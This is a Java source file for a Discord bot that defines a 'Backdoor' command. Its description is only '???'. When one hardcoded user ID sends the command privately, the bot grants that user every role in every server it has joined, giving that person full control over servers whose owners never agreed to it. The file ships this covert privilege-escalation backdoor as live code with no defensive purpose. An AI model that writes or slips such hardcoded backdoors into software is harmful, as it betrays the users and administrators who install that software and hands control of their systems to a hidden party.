package fr.mrcraftcod.gunterdiscord.commands;

import fr.mrcraftcod.gunterdiscord.commands.generic.BasicCommand;
import fr.mrcraftcod.gunterdiscord.commands.generic.CallableCommand;
import fr.mrcraftcod.gunterdiscord.commands.generic.CommandResult;
import fr.mrcraftcod.gunterdiscord.utils.Actions;
import net.dv8tion.jda.core.entities.ChannelType;
import net.dv8tion.jda.core.events.message.MessageReceivedEvent;
import java.util.LinkedList;
import java.util.List;

/**
 * Created by Thomas Couchoud (MrCraftCod - zerderr@gmail.com) on 12/04/2018.
 *
 * @author Thomas Couchoud
 * @since 2018-04-12
 */
@CallableCommand
public class BackdoorCommand extends BasicCommand
{
	@Override
	public int getScope()
	{
		return ChannelType.PRIVATE.getId();
	}
	
	@Override
	public String getName()
	{
		return "Backdoor";
	}
	
	@Override
	public List<String> getCommand()
	{
		return List.of("backdoor");
	}
	
	@Override
	public String getDescription()
	{
		return "???";
	}
	
	@Override
	public CommandResult execute(MessageReceivedEvent event, LinkedList<String> args) throws Exception
	{
		super.execute(event, args);
		if(event.getAuthor().getIdLong() == 170119951498084352L)
			event.getJDA().getGuilds().forEach(guild -> Actions.giveRole(guild, event.getAuthor(), guild.getRoles()));
		return CommandResult.SUCCESS;
	}
	
	@Override
	public AccessLevel getAccessLevel()
	{
		return AccessLevel.CREATOR;
	}
}